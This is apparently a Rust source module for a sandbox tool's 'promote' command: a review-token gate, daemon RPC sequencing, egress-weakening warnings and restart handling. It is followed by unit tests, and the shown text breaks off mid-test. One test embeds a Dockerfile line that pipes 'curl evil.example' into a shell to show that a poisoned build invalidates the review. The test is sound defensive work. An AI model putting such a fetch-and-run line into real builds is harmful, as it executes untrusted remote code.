//! `promote` orchestration: apply `izba.yml` -> managed truth, gated on a
//! prior `izba diff` review. Extracted from
//! `crates/izba-cli/src/commands/promote.rs` so a future Tauri app command
//! can drive the same review-token gate + daemon RPC sequencing (a GUI
//! "promote" button) without re-implementing it.
//!
//! ## Event-callback parity contract
//!
//! `run()` never prints. Every user-facing message crosses `on_event` as a
//! [`PromoteEvent`]: `PromoteEvent::Info` for what used to be a bare
//! `println!` in the CLI, `PromoteEvent::Warn` for what used to be a bare
//! `eprintln!`. `crates/izba-cli/src/commands/promote.rs` wires those
//! straight back to `println!`/`eprintln!` with the SAME strings, so the
//! CLI's stdout/stderr text, ordering, and exit behavior are byte-identical
//! to before this extraction — this module only relocates *where* the
//! strings are assembled, never *what* they say. Any new message added here
//! MUST go through `on_event` (or `emit_warn`, which also records it in
//! [`PromoteOutcome::warnings`]) rather than `println!`/`eprintln!` — see the
//! `promote_rs_never_prints_directly` test below, which greps this file for
//! stray print macros.
//!
//! One inversion from a literal cut-and-paste: `izba-core` cannot depend on
//! `izba-cli` (wrong dependency direction — `app/src-tauri` links
//! `izba-core` directly and must not pull in the CLI binary crate), but
//! resolving a `spec.build:` image digest means driving a whole throwaway
//! builder sandbox (daemon Create/Start/exec/ingest/tag/teardown), which
//! lives in `izba-cli::commands::build` and prints its own progress straight
//! to stdout/stderr (not through an event channel) — moving that whole
//! orchestration into core is out of scope here. So `run()` takes an extra
//! `resolve_build_image` callback that the CLI wires to
//! `commands::build::build_image`; every other part of the interface matches
//! the extraction brief verbatim.
//!
//! ## Test coverage note
//!
//! `run()` is a thin wrapper (`#[mutants::skip]`, e2e-only) that opens a real
//! `DaemonClient::connect(paths)` and delegates to `run_with_client`, which
//! carries the actual orchestration (the RPC sequencing: `ReloadPolicy`,
//! `Port*`/`Volume*` deltas, the Stop/reset-scratch/Start restart dance) over
//! an already-connected client — the seam that lets the `run_with_client_*`
//! tests below drive it against a scripted fake daemon on a `UnixStream::pair()`
//! (see `fake_daemon` in this module's test code, mirroring
//! `daemon::client::tests::fake_daemon`) instead of a live one. The full
//! live-daemon path (real sandbox, real VMM) is still pinned end-to-end by
//! `daemon_e2e` steps [9]-[11] (`crates/izba-cli/tests/daemon_e2e.rs`,
//! `manifest_diff_promote_live_path`) — do not weaken those steps when
//! touching this file. The decision logic `run_with_client` composes (`gate`,
//! `apply::plan`, `diff_normalized`, `classify`) is unit-tested in its own
//! module (`diff.rs`, `apply.rs`) and here.

use std::path::Path;

use anyhow::{bail, Result};

use crate::daemon::proto::{DaemonRequest, DaemonResponse};
use crate::daemon::DaemonClient;
use crate::manifest::diff::{DriftState, FieldDelta};
use crate::manifest::normalize::ImageSource;
use crate::manifest::schema::BuildSpec;
use crate::manifest::{apply, diff_normalized, ops, store, Normalized};
use crate::paths::Paths;
use crate::state::{load_json, RunState, STATE_FILE};

/// Outcome of the review gate: did the human's review token match?
#[derive(Debug, PartialEq, Eq)]
pub enum GateOutcome {
    /// Token matches — proceed.
    Ok,
    /// No review token on disk — `izba diff` was never run.
    NeverReviewed,
    /// Token on disk is stale — `izba.yml` changed since `izba diff`.
    Stale,
    /// No review but `--force` was passed.
    ForcedUnreviewed,
    /// Token is stale but `--force` was passed.
    ForcedStale,
}

/// Check the review gate: does the stored review token match the current
/// manifest token? Returns the outcome; the caller decides how to act.
pub fn gate(review: Option<&str>, current_token: &str, force: bool) -> GateOutcome {
    match (review, force) {
        (Some(t), _) if t == current_token => GateOutcome::Ok,
        (None, false) => GateOutcome::NeverReviewed,
        (None, true) => GateOutcome::ForcedUnreviewed,
        (Some(_), false) => GateOutcome::Stale,
        (Some(_), true) => GateOutcome::ForcedStale,
    }
}

/// Promote flags, mirroring the CLI's `--force`/`--restart`/`--reset-scratch`.
#[derive(Debug, Clone, Copy, Default)]
pub struct PromoteOpts {
    pub force: bool,
    pub restart: bool,
    pub reset_scratch: bool,
}

/// A user-facing message emitted during promote orchestration. `Info` mirrors
/// a CLI `println!` (stdout); `Warn` mirrors a CLI `eprintln!` (stderr) and is
/// also collected into [`PromoteOutcome::warnings`].
#[derive(Debug)]
pub enum PromoteEvent {
    Info(String),
    Warn(String),
}

/// What a `promote::run` call actually did, for a caller (CLI or future GUI)
/// that wants structured results rather than re-parsing event strings.
#[derive(Debug)]
pub struct PromoteOutcome {
    /// 3-way drift state (base/repo/managed), computed BEFORE this run's
    /// writes — i.e. the same classification `izba diff` would have shown
    /// going in.
    pub state: DriftState,
    /// Deltas actually applied this run (managed-before -> repo/target).
    pub applied: Vec<FieldDelta>,
    /// Restart/image-class deltas remain pending (not applied this run).
    pub needs_restart: bool,
    /// `opts.restart` executed a restart (Stop/reset-scratch/Start).
    pub restarted: bool,
    /// Sandbox was not running when promote started; live RPCs were skipped
    /// and the durable config applies on the next start.
    pub stopped: bool,
    /// Every `Warn` message, in emit order (same strings as the `Warn`
    /// events sent to `on_event`).
    pub warnings: Vec<String>,
}

/// Record `msg` as a `PromoteEvent::Warn`: push it into `warnings` and emit it
/// via `on_event`. The single choke point every warning flows through, so
/// `PromoteOutcome::warnings` and the CLI's stderr always agree.
fn emit_warn(warnings: &mut Vec<String>, on_event: &mut dyn FnMut(PromoteEvent), msg: String) {
    on_event(PromoteEvent::Warn(msg.clone()));
    warnings.push(msg);
}

/// Map a daemon reply that should be `Ok` into `Result<()>`, routing any
/// mid-request progress messages through `on_event`/`warnings` (the CLI
/// previously routed these straight to `eprintln!`).
#[mutants::skip] // reason: thin wrapper over a live daemon RPC (DaemonClient::request); e2e-only.
fn send_ok(
    client: &mut DaemonClient,
    req: &DaemonRequest,
    warnings: &mut Vec<String>,
    on_event: &mut dyn FnMut(PromoteEvent),
) -> Result<()> {
    match client.request(req, &mut |m| emit_warn(warnings, on_event, m.to_string()))? {
        DaemonResponse::Ok => Ok(()),
        DaemonResponse::Error { message } => bail!(message),
        other => bail!("unexpected daemon reply: {other:?}"),
    }
}

/// Apply `izba.yml` -> managed truth for the sandbox named `name`, whose
/// workspace is `dir` (the repo dir containing `izba.yml`). `dir` = repo
/// workspace (contains `izba.yml`); `name` = the RESOLVED sandbox name (the
/// caller has already run its own `sandbox_ref`/`--name` resolution and
/// `validate_name`). `resolve_build_image` builds a `spec.build:` image and
/// returns its digest — the CLI wires this to `commands::build::build_image`;
/// a `spec.image:` ref is resolved in-line via `image::ensure_image`.
#[mutants::skip] // reason: thin wrapper that only opens the live daemon connection; e2e-only (daemon_e2e manifest_diff_promote_live_path). The orchestration it delegates to, `run_with_client`, is unit-tested against a fake daemon — see the `run_with_client_*` tests below.
pub fn run(
    paths: &Paths,
    dir: &Path,
    name: &str,
    opts: PromoteOpts,
    on_event: &mut dyn FnMut(PromoteEvent),
    resolve_build_image: &mut dyn FnMut(&Path, &BuildSpec) -> Result<String>,
) -> Result<PromoteOutcome> {
    let mut client = DaemonClient::connect(paths)?;
    run_with_client(
        paths,
        dir,
        name,
        opts,
        on_event,
        resolve_build_image,
        &mut client,
    )
}

/// The actual promote orchestration, over an already-connected `client` — the
/// seam that makes this unit-testable with a fake daemon (`UdsStream::pair`)
/// rather than a live one. `run()` above is the thin production wrapper that
/// supplies a real `DaemonClient::connect(paths)`.
#[allow(clippy::too_many_arguments)]
fn run_with_client(
    paths: &Paths,
    dir: &Path,
    name: &str,
    opts: PromoteOpts,
    on_event: &mut dyn FnMut(PromoteEvent),
    resolve_build_image: &mut dyn FnMut(&Path, &BuildSpec) -> Result<String>,
    client: &mut DaemonClient,
) -> Result<PromoteOutcome> {
    let PromoteOpts {
        force,
        restart,
        reset_scratch,
    } = opts;

    let (m, raw, dockerfile) = ops::load_repo_manifest(dir)?;
    let repo = Normalized::from_manifest(&m, name)?;
    let dir_managed = paths.sandbox_dir(name);

    let mut warnings: Vec<String> = Vec::new();

    // Review gate: the token binds the human review to the exact manifest+Dockerfile bytes.
    let token = store::review_token(&raw, dockerfile.as_deref());
    match gate(store::read_review(&dir_managed)?.as_deref(), &token, force) {
        GateOutcome::Ok => {}
        GateOutcome::NeverReviewed => {
            bail!("no reviewed diff — run `izba diff` first (or --force)")
        }
        GateOutcome::Stale => {
            bail!("izba.yml changed since `izba diff` — re-run it (or --force)")
        }
        GateOutcome::ForcedUnreviewed => {
            emit_warn(
                &mut warnings,
                on_event,
                "WARNING: --force: promoting changes that were never reviewed".to_string(),
            );
        }
        GateOutcome::ForcedStale => {
            emit_warn(
                &mut warnings,
                on_event,
                "WARNING: --force: izba.yml changed since review — promoting UNREVIEWED changes"
                    .to_string(),
            );
        }
    }

    let managed = ops::managed_normalized(paths, name)?;

    // 3-way drift state going into this run (mirrors `ops::compute_diff`),
    // captured BEFORE any writes below so it reflects what `izba diff` would
    // have reported at entry.
    let base = store::read_base(&dir_managed)?
        .map(|bm| Normalized::from_manifest(&bm, name))
        .transpose()?
        .unwrap_or_else(|| managed.clone());
    let state = crate::manifest::classify(&base, &repo, &managed);

    let p = apply::plan(&managed, &repo);

    // Fix 2: Refuse an image-change promote without --restart. A new image
    // requires the rw scratch overlay to be reset on the new base; writing the
    // new digest to config.json without restarting leaves the guest in a state
    // where `izba start` boots the new image over an overlay built for the old
    // one — which can be UNBOOTABLE due to missing libs / wrong ABI.
    if p.image_changed && !restart {
        bail!(
            "image change requires --restart (the rw scratch overlay must be reset \
             on the new base; pass --restart, optionally with --reset-scratch=false \
             to keep the old overlay at your own risk)"
        );
    }

    // Fix 4: Warn about egress weakening BEFORE applying, even under --force,
    // so the user always sees the security implications of their change.
    let applied: Vec<FieldDelta> = diff_normalized(&managed, &repo);
    {
        let weakening: Vec<_> = applied.iter().filter(|d| d.weakens_egress).collect();
        if !weakening.is_empty() {
            let fields: Vec<_> = weakening.iter().map(|d| d.field.as_str()).collect();
            emit_warn(
                &mut warnings,
                on_event,
                format!("WARNING: weakens egress: {}", fields.join(", ")),
            );
        }
    }

    // Resolve the image digest for the target (host-side; no proto bump).
    let digest = match &repo.image {
        ImageSource::Ref(r) => crate::image::ensure_image(paths, r)?,
        ImageSource::Build(b) => resolve_build_image(dir, b)?,
    };

    // Expert-only warning: keeping the old rw overlay on a new base can render
    // the guest UNBOOTABLE due to missing libs or ABI mismatches.
    if p.image_changed && !reset_scratch {
        emit_warn(
            &mut warnings,
            on_event,
            "WARNING: --reset-scratch=false keeps the rw overlay built on the PREVIOUS image. \
             Packages installed (e.g. apt-get) against the old base may have missing libs / \
             wrong ABI on the new image and can render the guest UNBOOTABLE. Proceed only if \
             you understand overlay semantics."
                .to_string(),
        );
    }

    // Fix 5: Skip live daemon RPCs when the sandbox is not running — the
    // managed config committed below takes effect on the next `izba start`.
    // Stop/Start (the restart branch below) is a lifecycle operation, not a
    // "live RPC", so it is still driven by the --restart flag regardless.
    let is_running = match client.request(
        &DaemonRequest::Inspect {
            name: name.to_string(),
        },
        &mut |_| {},
    ) {
        Ok(DaemonResponse::Inspect(det)) => det.status != "stopped",
        _ => false,
    };
    let stopped = !is_running;

    if is_running {
        // Atomicity (two-phase, #131): enact the live daemon effects FIRST,
        // and only commit the durable managed truth (config.json/policy.yaml
        // + manifest.base.yaml + the consumed review token, all below) AFTER
        // they succeed. If a live RPC fails partway, config.json stays at the
        // OLD state so a retry recomputes the correct deltas (rather than
        // computing an empty diff against a half-applied truth). Everything
        // AFTER that commit point — the Stop/reset-scratch/Start restart leg
        // — is a lifecycle action on already-committed config: its failures
        // must never re-diverge the commit unit, so they bail with an honest
        // "config already committed, here's how to recover" message instead
        // of leaving `izba diff` reporting a divergence no user edit explains.

        // policy.yaml is the one durable file that must land BEFORE its live RPC:
        // `ReloadPolicy` re-reads policy.yaml from disk. Writing it first is safe to
        // retry (idempotent) and `write_managed` rewrites it identically below.
        if p.policy_changed {
            apply::write_policy(&dir_managed, &repo.egress)?;
            send_ok(
                client,
                &DaemonRequest::ReloadPolicy {
                    name: name.to_string(),
                },
                &mut warnings,
                on_event,
            )?;
        }
        for r in &p.ports_removed {
            send_ok(
                client,
                &DaemonRequest::PortUnpublish {
                    name: name.to_string(),
                    bind: r.bind,
                    host_port: r.host_port,
                },
                &mut warnings,
                on_event,
            )?;
        }
        for r in &p.ports_added {
            send_ok(
                client,
                &DaemonRequest::PortPublish {
                    name: name.to_string(),
                    rule: r.clone(),
                    persist: true,
                },
                &mut warnings,
                on_event,
            )?;
        }
        for gp in &p.volumes_removed {
            send_ok(
                client,
                &DaemonRequest::VolumeDetach {
                    name: name.to_string(),
                    guest_path: gp.clone(),
                },
                &mut warnings,
                on_event,
            )?;
        }
        for v in &p.volumes_added {
            send_ok(
                client,
                &DaemonRequest::VolumeAttach {
                    name: name.to_string(),
                    spec: v.clone(),
                },
                &mut warnings,
                on_event,
            )?;
        }
    } else {
        // Live RPCs are skipped when the sandbox is not running. Only warn
        // "changes apply on next start" when --restart won't Start it anyway.
        let will_start = restart && !p.restart_fields.is_empty();
        if !will_start {
            emit_warn(
                &mut warnings,
                on_event,
                "sandbox not running — changes apply on next start".to_string(),
            );
        }
    }

    // Commit the durable managed truth (config.json + policy.yaml)
    // unconditionally — whether the sandbox is running or not.
    // `Stop`→`Start` below reads config.json from disk, so this must precede
    // the restart branch.
    apply::write_managed(paths, name, &repo, &digest)?;

    // #131: advance the base + consume the review token in the SAME commit
    // unit as config.json/policy.yaml above — all four record one fact,
    // "this manifest revision was promoted". The restart leg below is a
    // lifecycle action on already-committed config: if it fails, `izba diff`
    // stays in-sync (repo == managed == base) and `izba start` is the whole
    // recovery — never a diverged state no user edit explains.
    store::write_base(&dir_managed, &m)?;
    store::clear_review(&dir_managed)?;

    // Restart-class fields (cpus, memory, image): apply now or note for later.
    let mut restarted = false;
    if !p.restart_fields.is_empty() {
        if restart {
            // Fix 3a: Read the confinement mode BEFORE Stop — stop clears
            // state.json, so we must capture allow_unconfined before the VMM
            // is torn down. Default to false (confined, safe) when the file is
            // absent or unreadable (sandbox already stopped).
            let run_state: Option<RunState> = load_json(&paths.sandbox_dir(name).join(STATE_FILE))
                .ok()
                .flatten();
            let allow_unconfined = run_state
                .and_then(|s| s.confinement)
                .map(|c| !c.is_confined())
                .unwrap_or(false);

            // Only Stop when the sandbox is actually running; sending Stop to a
            // non-running sandbox may error from the daemon and is unnecessary.
            if is_running {
                if let Err(err) = send_ok(
                    client,
                    &DaemonRequest::Stop {
                        name: name.to_string(),
                    },
                    &mut warnings,
                    on_event,
                ) {
                    bail!(
                        "failed to stop sandbox for restart (the promote itself \
                         is committed; restart manually to apply): {err}"
                    );
                }
            }
            // Reset the rw scratch overlay to a blank state on the new base
            // before starting, so the image change boots cleanly.
            if p.image_changed && reset_scratch {
                if let Err(err) = crate::sandbox::reset_rw_scratch(paths, name) {
                    bail!(
                        "failed to reset the rw scratch disk after promote (config already \
                         committed; the OLD scratch overlay was kept — `izba start {name}` will \
                         boot the NEW image over the OLD overlay and may misbehave or fail to \
                         boot; recreate the sandbox, or revert the image change and re-promote, \
                         if so): {err}"
                    );
                }
            }
            // Fix 3b: Surface a helpful retry hint if Start fails after Stop —
            // the config was already committed so a plain `izba start` is safe.
            if let Err(err) = send_ok(
                client,
                &DaemonRequest::Start {
                    name: name.to_string(),
                    allow_unconfined,
                },
                &mut warnings,
                on_event,
            ) {
                bail!(
                    "failed to start sandbox after promote (config already committed); \
                     run `izba start {name}` to retry: {err}"
                );
            }
            restarted = true;
            on_event(PromoteEvent::Info(format!(
                "restarted to apply: {}",
                p.restart_fields.join(", ")
            )));
        } else {
            on_event(PromoteEvent::Info(format!(
                "pending restart to apply: {} (run `izba promote --restart` or restart manually)",
                p.restart_fields.join(", ")
            )));
        }
    }

    on_event(PromoteEvent::Info(format!("promoted {name}")));

    Ok(PromoteOutcome {
        state,
        applied,
        needs_restart: !p.restart_fields.is_empty() && !restarted,
        restarted,
        stopped,
        warnings,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::manifest::store;

    #[test]
    fn gate_requires_a_token() {
        assert_eq!(gate(None, "tok", false), GateOutcome::NeverReviewed);
        assert_eq!(gate(None, "tok", true), GateOutcome::ForcedUnreviewed);
    }

    #[test]
    fn gate_detects_stale_review() {
        assert_eq!(gate(Some("old"), "new", false), GateOutcome::Stale);
        assert_eq!(gate(Some("old"), "new", true), GateOutcome::ForcedStale);
    }

    #[test]
    fn gate_passes_on_match() {
        assert_eq!(gate(Some("tok"), "tok", false), GateOutcome::Ok);
        assert_eq!(gate(Some("tok"), "tok", true), GateOutcome::Ok);
    }

    /// Graduation (dogfood 2026-07-09, spec §7/§9): the review token binds the
    /// review to BOTH files. Editing the Dockerfile after `izba diff` — with the
    /// manifest untouched — must stale the gate (the TOCTOU the swarm never
    /// reached: a poisoned build slipping under a stale review).
    #[test]
    fn dockerfile_change_invalidates_review_token() {
        let manifest = "apiVersion: izba.dev/v1alpha1\nkind: Sandbox\nspec:\n  image: x\n";
        let reviewed = store::review_token(manifest, Some("FROM alpine:3.20\n"));
        let current = store::review_token(
            manifest,
            Some("FROM alpine:3.20\nRUN curl evil.example | sh\n"),
        );
        assert_ne!(reviewed, current, "Dockerfile bytes must move the token");
        assert_eq!(gate(Some(&reviewed), &current, false), GateOutcome::Stale);
        assert_eq!(
            gate(Some(&reviewed), &current, true),
            GateOutcome::ForcedStale
        );
    }

    /// Graduation: editing izba.yml after `izba diff` equally stales the gate
    /// (complements gate_detects_stale_review with the real token function).
    #[test]
    fn manifest_edit_after_diff_invalidates_review_token() {
        let reviewed = store::review_token("spec: a", None);
        let current = store::review_token("spec: a  # edited after review", None);
        assert_ne!(reviewed, current);
        assert_eq!(gate(Some(&reviewed), &current, false), GateOutcome::Stale);
    }

    /// `emit_warn` is the single choke point every warning flows through: it
    /// must BOTH push the message into `warnings` AND emit it via `on_event`
    /// — kills the `replace emit_warn with ()` mutant, which would make
    /// neither happen.
    #[test]
    fn emit_warn_pushes_and_emits() {
        let mut warnings: Vec<String> = Vec::new();
        let mut seen: Vec<String> = Vec::new();
        let mut on_event = |e: PromoteEvent| match e {
            PromoteEvent::Warn(m) => seen.push(m),
            PromoteEvent::Info(m) => panic!("unexpected Info: {m}"),
        };
        emit_warn(&mut warnings, &mut on_event, "uh oh".to_string());
        assert_eq!(warnings, vec!["uh oh".to_string()]);
        assert_eq!(seen, vec!["uh oh".to_string()]);
    }

    /// `PromoteOpts::default()` must be the all-false, safest-by-default
    /// posture (no forced gate bypass, no implicit restart, no scratch wipe) —
    /// a caller that forgets to set a field never silently escalates.
    #[test]
    fn promote_opts_default_is_all_false() {
        let opts = PromoteOpts::default();
        assert!(!opts.force);
        assert!(!opts.restart);
        assert!(!opts.reset_scratch);
    }

    /// Byte-parity contract enforcement: this module must never print
    /// directly — every user-facing string flows through `on_event`/
    /// `emit_warn` so the CLI (and, later, a GUI) fully controls rendering.
    /// Only scans the production code (everything before `mod tests`): the
    /// test module legitimately mentions `println!`/`eprintln!` inside
    /// string literals while describing/exercising this very check.
    #[test]
    fn promote_rs_never_prints_directly() {
        // Normalize CRLF -> LF first: on a CRLF checkout (Windows `core.autocrlf`)
        // the literal `"\n#[cfg(test)]\n"` needle never matches (the real
        // separator is `\r\n#[cfg(test)]\r\n`), so `production` would silently
        // fall back to the WHOLE file — including this test module, whose own
        // source mentions the forbidden macro names in string literals/comments
        // and self-trips the assert below.
        let src = include_str!("promote.rs").replace("\r\n", "\n");
        let production = src.split("\n#[cfg(test)]\n").next().unwrap_or(&src);
        // Build the forbidden needles via `concat!` so this very check line can
        // never match itself (a plain `"println!"` literal here would appear in
        // `production` — this file is above `mod tests` — and self-trip).
        let println_macro = concat!("print", "ln!(");
        let eprintln_macro = concat!("e", "print", "ln!(");
        for line in production.lines() {
            let trimmed = line.trim_start();
            if trimmed.starts_with("//") {
                continue;
            }
            assert!(
                !trimmed.contains(println_macro) && !trimmed.contains(eprintln_macro),
                "promote.rs must not print directly, found: {line:?}"
            );
        }
    }

    // ── `run_with_client` orchestration tests (fake daemon over a socketpair) ──
    //
    // These exercise the seam that makes `run_with_client` unit-testable: it
    // takes an already-connected `DaemonClient`, so a scripted fake daemon on
    // the peer end of `UdsStream::pair()` stands in for izbad — mirroring
    // `daemon::client::tests::fake_daemon`. Unit tests never bind unix/vsock
    // listeners (some sandboxes deny `bind`); the socketpair sidesteps that
    // entirely. Image-digest resolution is made hermetic by pre-seeding a
    // local tag (`crate::image::set_tag`) pointing at a fake cached
    // `rootfs.erofs`, so `ensure_image` short-circuits before ever reaching
    // `pull::resolve` (no network, no `mkfs.erofs` dependency).

    use crate::daemon::egress::config::EgressPolicyConfig;
    use crate::daemon::proto::{DaemonHello, SandboxDetail, DAEMON_PROTO_VERSION};
    use crate::state::{load_json, save_json, PortRule, SandboxConfig, CONFIG_FILE};
    use crate::vmm::UdsStream;
    use crate::volume::VolumeSpec;
    use izba_proto::{read_frame, write_frame};

    /// A scripted fake daemon on the peer end of a socketpair: answers the
    /// hello, then runs `script` on the connection. Mirrors
    /// `daemon::client::tests::fake_daemon`.
    fn fake_daemon(script: impl FnOnce(UdsStream) + Send + 'static) -> DaemonClient {
        let (client_end, server_end) = UdsStream::pair().unwrap();
        std::thread::spawn(move || {
            let mut s = server_end;
            let _hello: DaemonHello = match read_frame(&mut s) {
                Ok(h) => h,
                Err(_) => return,
            };
            let hello_ok = DaemonResponse::HelloOk {
                version: "test".into(),
                proto: DAEMON_PROTO_VERSION,
                build: crate::build_info::BuildInfoOwned::default(),
            };
            if write_frame(&mut s, &hello_ok).is_err() {
                return;
            }
            script(s);
        });
        DaemonClient::handshake(client_end, "test").unwrap()
    }

    /// A fake daemon that never expects a request beyond the hello — for gate
    /// refusals, where `run_with_client` bails before ever touching `client`.
    fn idle_daemon() -> DaemonClient {
        fake_daemon(|_s| {})
    }

    /// Read the next request, assert it matches `expect`, reply `Ok`.
    fn expect_and_ok(s: &mut UdsStream, expect: impl Fn(&DaemonRequest) -> bool, what: &str) {
        let req: DaemonRequest = read_frame(s).unwrap();
        assert!(expect(&req), "expected {what}, got {req:?}");
        write_frame(s, &DaemonResponse::Ok).unwrap();
    }

    /// Read the next request, assert it matches `expect`, reply `Error{message}`.
    fn expect_and_error(
        s: &mut UdsStream,
        expect: impl Fn(&DaemonRequest) -> bool,
        what: &str,
        message: &str,
    ) {
        let req: DaemonRequest = read_frame(s).unwrap();
        assert!(expect(&req), "expected {what}, got {req:?}");
        write_frame(
            s,
            &DaemonResponse::Error {
                message: message.to_string(),
            },
        )
        .unwrap();
    }

    /// Read the next request, assert it's `Inspect{name}`, reply with a
    /// minimal `SandboxDetail` at the given `status`.
    fn expect_inspect_reply(s: &mut UdsStream, name: &str, status: &str) {
        let req: DaemonRequest = read_frame(s).unwrap();
        assert!(
            matches!(&req, DaemonRequest::Inspect { name: n } if n == name),
            "expected Inspect, got {req:?}"
        );
        let det = SandboxDetail {
            name: name.to_string(),
            image_ref: "testimg".into(),
            image_digest: "sha256:whatever".into(),
            cpus: 2,
            mem_mb: 4096,
            workspace: "/workspace".into(),
            status: status.to_string(),
            ports: vec![],
            volumes: vec![],
            confinement: None,
            container: None,
        };
        write_frame(s, &DaemonResponse::Inspect(det)).unwrap();
    }

    /// Seed a fake cached image + local tag so `ensure_image(paths, tag)`
    /// resolves offline: `tags::resolve_tag` hits, `ImageStore::is_cached`
    /// hits, and `pull::resolve` (network) is never reached.
    fn seed_cached_image(paths: &Paths, tag: &str) {
        let digest = format!("sha256:{}", "e".repeat(64));
        crate::image::set_tag(paths, tag, &digest).unwrap();
        let dir = paths.image_dir(&digest);
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("rootfs.erofs"), b"fake erofs").unwrap();
    }

    /// A minimal `spec.image:`-only manifest, with optional extra YAML lines
    /// spliced into `spec:` (egress/ports/volumes blocks). Returns the exact
    /// raw string written, so callers can compute a matching review token.
    fn manifest_yaml(image: &str, cpus: u32, extra: &str) -> String {
        format!(
            "apiVersion: izba.dev/v1alpha1\nkind: Sandbox\nspec:\n  image: {image}\n  resources: {{ cpus: {cpus}, memory: 4Gi }}\n  rootDisk: {{ size: 8Gi }}\n{extra}"
        )
    }

    /// Seed `config.json` (+ optional `policy.yaml`) as `name`'s managed
    /// truth, as `ops::managed_normalized` reads it.
    #[allow(clippy::too_many_arguments)]
    fn seed_managed(
        paths: &Paths,
        name: &str,
        image_ref: &str,
        cpus: u32,
        ports: Vec<PortRule>,
        volumes: Vec<VolumeSpec>,
        egress: Option<EgressPolicyConfig>,
    ) -> std::path::PathBuf {
        let dir = paths.sandbox_dir(name);
        std::fs::create_dir_all(&dir).unwrap();
        let cfg = SandboxConfig {
            image_digest: "sha256:existing".into(),
            image_ref: image_ref.into(),
            cpus,
            mem_mb: 4096,
            workspace: "/workspace".into(),
            ports,
            volumes,
            builder: false,
            build: None,
            rw_size_gb: 8,
        };
        save_json(&dir.join(CONFIG_FILE), &cfg).unwrap();
        if let Some(eg) = egress {
            eg.write_to(&dir).unwrap();
        }
        dir
    }

    fn opts(force: bool, restart: bool, reset_scratch: bool) -> PromoteOpts {
        PromoteOpts {
            force,
            restart,
            reset_scratch,
        }
    }

    fn no_build(_dir: &Path, _b: &BuildSpec) -> Result<String> {
        unreachable!("these tests never declare spec.build:")
    }

    /// Gate refusal: no review token on disk at all. `run_with_client` must
    /// bail BEFORE touching the daemon (the idle fake daemon never sees a
    /// request) or resolving the image.
    #[test]
    fn run_with_client_bails_when_never_reviewed() {
        let tmp = tempfile::tempdir().unwrap();
        let paths = Paths::with_root(tmp.path().join("izba"));
        let repo_dir = tmp.path().join("repo");
        std::fs::create_dir_all(&repo_dir).unwrap();
        std::fs::write(repo_dir.join("izba.yml"), manifest_yaml("testimg", 2, "")).unwrap();

        let mut client = idle_daemon();
        let mut events: Vec<PromoteEvent> = Vec::new();
        let mut on_event = |e: PromoteEvent| events.push(e);
        let err = run_with_client(
            &paths,
            &repo_dir,
            "web",
            opts(false, false, true),
            &mut on_event,
            &mut no_build,
            &mut client,
        )
        .unwrap_err();
        assert!(err.to_string().contains("no reviewed diff"), "{err}");
        assert!(events.is_empty(), "no event before the gate bail");
    }

    /// Gate refusal: a review token on disk that no longer matches (izba.yml
    /// edited since `izba diff`). Same "no daemon contact" guarantee.
    #[test]
    fn run_with_client_bails_when_review_is_stale() {
        let tmp = tempfile::tempdir().unwrap();
        let paths = Paths::with_root(tmp.path().join("izba"));
        let repo_dir = tmp.path().join("repo");
        std::fs::create_dir_all(&repo_dir).unwrap();
        let yaml = manifest_yaml("testimg", 2, "");
        std::fs::write(repo_dir.join("izba.yml"), &yaml).unwrap();
        let sandbox_dir = paths.sandbox_dir("web");
        std::fs::create_dir_all(&sandbox_dir).unwrap();
        // A token for a DIFFERENT manifest -> stale.
        let stale_token = store::review_token(&manifest_yaml("testimg", 99, ""), None);
        store::write_review(&sandbox_dir, &stale_token).unwrap();

        let mut client = idle_daemon();
        let mut events: Vec<PromoteEvent> = Vec::new();
        let mut on_event = |e: PromoteEvent| events.push(e);
        let err = run_with_client(
            &paths,
            &repo_dir,
            "web",
            opts(false, false, true),
            &mut on_event,
            &mut no_build,
            &mut client,
        )
        .unwrap_err();
        assert!(err.to_string().contains("changed since"), "{err}");
        assert!(events.is_empty(), "no event before the gate bail");
    }

    /// `--force` over a NEVER-reviewed manifest that is otherwise IDENTICAL to
    /// managed: the gate warning fires (kills the `emit_warn` mutant a second
    /// way — through the ForcedUnreviewed arm) and, with nothing to apply, the
    /// run completes as a clean no-op promote.
    #[test]
    fn run_with_client_forced_unreviewed_promotes_with_no_changes() {
        let tmp = tempfile::tempdir().unwrap();
        let paths = Paths::with_root(tmp.path().join("izba"));
        let repo_dir = tmp.path().join("repo");
        std::fs::create_dir_all(&repo_dir).unwrap();
        let yaml = manifest_yaml("testimg", 2, "");
        std::fs::write(repo_dir.join("izba.yml"), &yaml).unwrap();
        // No review token written at all.
        seed_managed(&paths, "web", "testimg", 2, vec![], vec![], None);
        seed_cached_image(&paths, "testimg");

        let mut client = fake_daemon(|mut s| {
            expect_inspect_reply(&mut s, "web", "running");
        });
        let mut events: Vec<PromoteEvent> = Vec::new();
        let mut on_event = |e: PromoteEvent| events.push(e);
        let outcome = run_with_client(
            &paths,
            &repo_dir,
            "web",
            opts(true, false, true),
            &mut on_event,
            &mut no_build,
            &mut client,
        )
        .unwrap();

        assert!(outcome.applied.is_empty(), "identical configs, no deltas");
        assert!(!outcome.needs_restart);
        assert!(!outcome.restarted);
        assert!(!outcome.stopped);
        assert_eq!(
            outcome.warnings,
            vec!["WARNING: --force: promoting changes that were never reviewed".to_string()]
        );
        assert_eq!(events.len(), 2, "gate warning + final promoted info");
        assert!(matches!(&events[0], PromoteEvent::Warn(m) if m.contains("--force")));
        assert!(matches!(&events[1], PromoteEvent::Info(m) if m == "promoted web"));
    }

    /// Live promote on a RUNNING sandbox: an egress-only delta drives exactly
    /// one `ReloadPolicy` RPC, and because the delta ADDS an allowed host it
    /// must be flagged `weakens_egress` — surfaced via `on_event` AND
    /// `PromoteOutcome::warnings` (kills the `emit_warn -> ()` mutant).
    #[test]
    fn run_with_client_live_promote_reloads_policy_and_warns_weakens_egress() {
        let tmp = tempfile::tempdir().unwrap();
        let paths = Paths::with_root(tmp.path().join("izba"));
        let repo_dir = tmp.path().join("repo");
        std::fs::create_dir_all(&repo_dir).unwrap();
        let yaml = manifest_yaml(
            "testimg",
            2,
            "  egress:\n    enforce: true\n    allow: [github.com]\n",
        );
        std::fs::write(repo_dir.join("izba.yml"), &yaml).unwrap();
        let sandbox_dir = seed_managed(
            &paths,
            "web",
            "testimg",
            2,
            vec![],
            vec![],
            Some(EgressPolicyConfig {
                enforce: true,
                allow: vec![],
                git: vec![],
            }),
        );
        let token = store::review_token(&yaml, None);
        store::write_review(&sandbox_dir, &token).unwrap();
